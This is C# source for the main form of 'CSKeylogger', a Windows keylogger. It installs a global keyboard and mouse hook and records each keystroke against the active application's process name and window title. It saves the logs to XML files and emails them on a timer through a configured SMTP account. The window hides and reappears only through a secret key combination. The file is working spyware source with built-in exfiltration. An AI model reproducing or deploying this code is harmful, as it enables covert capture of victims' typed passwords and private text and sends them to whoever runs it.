using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Threading;
using System.Windows.Forms;

namespace KeyLogger
{
    public partial class FrmMain : Form
    {
        private readonly Frmoptions _option;
        private Stack _appNames;
        private bool _allowtoTik;
        private UserActivityHook _hooker;

        private bool _isAltDown;
        private bool _isControlDown;
        private bool _isFsDown;
        private bool _isHide;
        private bool _isShiftDown;
        private int _tik;
        private Params _emailparams;
        private bool _isEmailerOn;
        private bool _isLoggerOn;

        private Hashtable _logData;
        private string _logfilepath = Application.StartupPath + @"\Acitivitylog.xml";

        public FrmMain()
        {
            InitializeComponent();
            _option = new Frmoptions();
        }

        private void ButtonStartClick(object sender, EventArgs e)
        {
            if (!_hooker.IsActive)
            {
                _hooker.Start();
                if (_isEmailerOn)
                    timer_emailer.Enabled = true;
                if (_isLoggerOn)
                    timer_logsaver.Enabled = true;
            }
        }

        private void ButtonStopClick(object sender, EventArgs e)
        {
            if (_hooker.IsActive)
            {
                _hooker.Stop();
                timer_emailer.Enabled = false;
                timer_logsaver.Enabled = false;
            }
        }

        private void MainFormLoad(object sender, EventArgs e)
        {
            _hooker = new UserActivityHook();
            _hooker.OnMouseActivity += MouseMoved;
            _hooker.KeyDown += HookerKeyDown;
            _hooker.KeyPress += HookerKeyPress;
            _hooker.KeyUp += HookerKeyUp;
            _hooker.Stop();

            _appNames = new Stack();
            _logData = new Hashtable();
        }

        public void MouseMoved(object sender, MouseEventArgs e)
        {
            labelMousePosition.Text = String.Format("X:{0},Y={1},Wheel:{2}", e.X, e.Y, e.Delta);
            if (e.Clicks <= 0) return;
            txt_MouseLog.AppendText("MouseButton:" + e.Button);
            txt_MouseLog.AppendText(Environment.NewLine);
        }

        public void HookerKeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyData.ToString() == "Return")
                Logger("[Enter]");
            if (e.KeyData.ToString() == "Escape")
                Logger("[Escape]");
            //Logger(e.KeyData + Environment.NewLine);
            switch (e.KeyData.ToString())
            {
                case "RMenu":
                case "LMenu":
                    _isAltDown = true;
                    break;
                case "RControlKey":
                case "LControlKey":
                    _isControlDown = true;
                    break;
                case "LShiftKey":
                case "RShiftKey":
                    _isShiftDown = true;
                    break;
                case "F10":
                case "F11":
                case "F12":
                    _isFsDown = true;
                    break;
            }

            if (_isAltDown && _isControlDown && _isShiftDown && _isFsDown)
                if (_isHide)
                {
                    Show();
                    _isHide = false;
                }
                else
                {
                    Hide();
                    _isHide = true;
                }
        }

        public void HookerKeyPress(object sender, KeyPressEventArgs e)
        {
            _allowtoTik = true;
            if ((byte) e.KeyChar == 9)
                Logger("[TAB]");
            else if (Char.IsLetterOrDigit(e.KeyChar) || Char.IsPunctuation(e.KeyChar))
                Logger(e.KeyChar.ToString());
            else if (e.KeyChar == 32)
                Logger(" ");
            else if (e.KeyChar != 27 && e.KeyChar != 13) //Escape
                Logger("[Char\\" + ((byte) e.KeyChar) + "]");

            _tik = 0;
        }

        public void HookerKeyUp(object sender, KeyEventArgs e)
        {
            //Logger("KeyUP : " + e.KeyData.ToString() + Environment.NewLine);
            switch (e.KeyData.ToString())
            {
                case "RMenu":
                case "LMenu":
                    _isAltDown = false;
                    break;
                case "RControlKey":
                case "LControlKey":
                    _isControlDown = false;
                    break;
                case "LShiftKey":
                case "RShiftKey":
                    _isShiftDown = false;
                    break;
                case "F10":
                case "F11":
                case "F12":
                    _isFsDown = false;
                    break;
            }
        }

        private void Logger(string txt)
        {
            txt_Log.AppendText(txt);
            txt_Log.SelectionStart = txt_Log.Text.Length;

            try
            {
                Process p = Process.GetProcessById(APIs.GetWindowProcessID(APIs.getforegroundWindow()));
                string _appName = p.ProcessName;
                string _appltitle = APIs.ActiveApplTitle().Trim().Replace("\0", "");
                string _thisapplication = _appltitle + "######" + _appName;
                if (!_appNames.Contains(_thisapplication))
                {
                    _appNames.Push(_thisapplication);
                    _logData.Add(_thisapplication, "");
                }
                IDictionaryEnumerator en = _logData.GetEnumerator();
                while (en.MoveNext())
                {
                    if (en.Key.ToString() == _thisapplication)
                    {
                        string prlogdata = en.Value.ToString();
                        _logData.Remove(_thisapplication);
                        _logData.Add(_thisapplication, prlogdata + " " + txt);
                        break;
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message + ":" + ex.StackTrace);
                throw;
            }
        }

        private void Timer1Tick(object sender, EventArgs e)
        {
            if (_allowtoTik)
            {
                _tik += 1;

                if (_tik != 20) return;
                Logger(Environment.NewLine);
                _tik = 0;
                _allowtoTik = false;
            }

            if (txt_CurrentWindowstitle.Text == Text)
                txt_CurrentWindowstitle.Text = "Current Window Title";
        }

        private void BtnHideClick(object sender, EventArgs e)
        {
            Hide();
            _hooker.Start();
            _isHide = true;
        }

        private void BtnExitClick(object sender, EventArgs e)
        {
            Application.Exit();
        }

        public static void SendMail(object data)
        {
            try
            {
                string mailaddress = ((Params) data).Mailaddress;
                string smtpHost = ((Params) data).SmtpHost;
                int smtpPort = ((Params) data).SmtpPort;
                string mailpassword = ((Params) data).Mailpassword;
                string logstr = ((Params) data).Logstr;
                bool sslstate = ((Params) data).EnableSsl;

                var fromAddress = new MailAddress(mailaddress, "CSKeylogger");
                var toAddress = new MailAddress(mailaddress, "CSKeylogger");
                const string subject = "Key logger Log file !";
                var smtp = new SmtpClient
                               {
                                   Host = smtpHost,
                                   Port = smtpPort,
                                   EnableSsl = sslstate,
                                   DeliveryMethod = SmtpDeliveryMethod.Network,
                                   UseDefaultCredentials = false,
                                   Credentials = new NetworkCredential(fromAddress.Address, mailpassword)
                               };
                using (var message = new MailMessage(fromAddress, toAddress)
                                         {
                                             Subject = subject,
                                             Body = logstr,
                                         })
                {
                    smtp.Send(message);
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message, ex.StackTrace);
            }
        }

        private void TimerEmailerTick(object sender, EventArgs e)
        {
            string logstr = Generatelog();
            var _params = new Params(logstr, _emailparams.Mailaddress,
                                     _emailparams.Mailpassword, _emailparams.SmtpHost,
                                     _emailparams.SmtpPort, _emailparams.EnableSsl);
            var mailer = new Thread(SendMail);
            mailer.Start(_params);
        }

        private void TimerLogsaverTick(object sender, EventArgs e)
        {
            SaveLogfile(_logfilepath);
        }

        private void mnuItem_Settings_Click(object sender, EventArgs e)
        {
            // we don't want log our email password!
            if (_hooker.IsActive)
                _hooker.Stop();

            if (_option.ShowDialog() == DialogResult.OK)
            {
                if (_option.chk_autoemailer.Checked)
                {
                    _emailparams = new Params(null, _option.txt_emailAddress.Text, 
                                             _option.txt_emailpassword.Text,
                                             _option.txt_smtpServer.Text, 
                                             Convert.ToInt32(_option.txt_smtpport.Text),
                                             _option.chk_usessl.Checked);

                    timer_emailer.Interval = (int) (_option.numeric_emailtime.Value*60000);
                    timer_emailer.Enabled = true;
                    _isEmailerOn = true;
                }
                else
                {
                    timer_emailer.Enabled = false;
                    _isEmailerOn = false;
                }
                if (_option.chk_autosaver.Checked)
                {
                    if (_option.txt_filelocation.Text.ToLower() != "Activitylog.xml".ToLower())
                        _logfilepath = _option.txt_filelocation.Text;

                    timer_logsaver.Interval = (int) (_option.numeric_savetimer.Value*60000);
                    timer_logsaver.Enabled = true;
                    _isLoggerOn = true;
                }
                else
                {
                    timer_logsaver.Enabled = false;
                    _isLoggerOn = false;
                }
            }
        }

        //Start Menu Events
        private void MnuItemAboutClick(object sender, EventArgs e)
        {
            var About = new frmAbout();
            About.TopMost = true;
            About.ShowDialog();
        }

        private void MnuItemHideClick(object sender, EventArgs e)
        {
            Hide();
            _hooker.Start();
            _isHide = true;
        }

        private void MnuItemExitClick(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void MnuItemSaveClick(object sender, EventArgs e)
        {
            var savef = new SaveFileDialog
                            {
                                Title = "Save ...",
                                Filter = "CSKeylogger log files (*.xml)|*.xml",
                                FileName = "Logfile.xml"
                            };
            if (savef.ShowDialog() == DialogResult.OK)
            {
                SaveLogfile(savef.FileName);
            }
        }


        //End Menu Events

        private void SaveLogfile(string pathtosave)
        {
            try
            {
                string xlspath = _logfilepath.Substring(0, _logfilepath.LastIndexOf("\\") + 1) + "ApplogXSL.xsl";
                if (!File.Exists(xlspath))
                {
                    File.Create(xlspath).Close();
                    string xslcontents =
                        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"><xsl:template match=\"/\"> <html> <body>  <h2>CS Key logger Log file</h2>  <table border=\"1\"> <tr bgcolor=\"Silver\">  <th>Window Title</th>  <th>Process Name</th>  <th>Log Data</th> </tr> <xsl:for-each select=\"ApplDetails/Apps_Log\"><xsl:sort select=\"ApplicationName\"/> <tr>  <td><xsl:value-of select=\"ProcessName\"/></td>  <td><xsl:value-of select=\"ApplicationName\"/></td>  <td><xsl:value-of select=\"LogData\"/></td> </tr> </xsl:for-each>  </table> </body> </html></xsl:template></xsl:stylesheet>";
                    var xslwriter = new StreamWriter(xlspath);
                    xslwriter.Write(xslcontents);
                    xslwriter.Flush();
                    xslwriter.Close();
                }
                var writer = new StreamWriter(pathtosave, false);
                IDictionaryEnumerator element = _logData.GetEnumerator();
                writer.Write("<?xml version=\"1.0\"?>");
                writer.WriteLine("");
                writer.Write("<?xml-stylesheet type=\"text/xsl\" href=\"ApplogXSL.xsl\"?>");
                writer.WriteLine("");
                writer.Write("<ApplDetails>");

                while (element.MoveNext())
                {
                    writer.Write("<Apps_Log>");
                    writer.Write("<ProcessName>");
                    string processname = "<![CDATA[" +
                                         element.Key.ToString().Trim().Substring(0,
                                                                                 element.Key.ToString().Trim().
                                                                                     LastIndexOf("######")).Trim() +
                                         "]]>";
                    processname = processname.Replace("\0", "");
                    writer.Write(processname);
                    writer.Write("</ProcessName>");

                    writer.Write("<ApplicationName>");
                    string applname = "<![CDATA[" +
                                      element.Key.ToString().Trim().Substring(
                                          element.Key.ToString().Trim().LastIndexOf("######") + 6).Trim() + "]]>";
                    writer.Write(applname);
                    writer.Write("</ApplicationName>");
                    writer.Write("<LogData>");
                    string ldata = ("<![CDATA[" + element.Value.ToString().Trim() + "]]>").Replace("\0", "");
                    writer.Write(ldata);

                    writer.Write("</LogData>");
                    writer.Write("</Apps_Log>");
                }
                writer.Write("</ApplDetails>");
                writer.Flush();
                writer.Close();
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message, ex.StackTrace);
            }
        }

        private string Generatelog()
        {
            try
            {
                string Logdata = "CS Key logger Log Data" + Environment.NewLine;

                IDictionaryEnumerator element = _logData.GetEnumerator();
                while (element.MoveNext())
                {
                    string processname =
                        element.Key.ToString().Trim().Substring(0, element.Key.ToString().Trim().LastIndexOf("######")).
                            Trim();
                    string applname =
                        element.Key.ToString().Trim().Substring(element.Key.ToString().Trim().LastIndexOf("######") + 6)
                            .Trim();
                    string ldata = element.Value.ToString().Trim();

                    if (applname.Length < 25 && processname.Length < 25)
                    {
                        Logdata += applname.PadRight(25, '-');
                        Logdata += processname.PadLeft(25, '-');
                        Logdata += Environment.NewLine + "Log Data :" + Environment.NewLine;
                        Logdata += ldata + Environment.NewLine + Environment.NewLine;
                    }
                }
                Logdata += Environment.NewLine + Environment.NewLine + Environment.NewLine +
                           String.Format("LOG FILE, Data {0}", DateTime.Now.ToString());
                return Logdata;
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message, ex.StackTrace);
            }
            return null;
        }

        #region Nested type: Params

        public class Params
        {
            public bool EnableSsl;
            public string Logstr;
            public string Mailaddress;
            public string Mailpassword;
            public string SmtpHost;
            public int SmtpPort;

            public Params(string logstr, string mailaddress, string mailpassword, string smtpHost, int smtpPort,
                          bool enablessl)
            {
                Logstr = logstr;
                Mailaddress = mailaddress;
                Mailpassword = mailpassword;
                SmtpHost = smtpHost;
                SmtpPort = smtpPort;
                EnableSsl = enablessl;
            }
        }

        #endregion
    }
}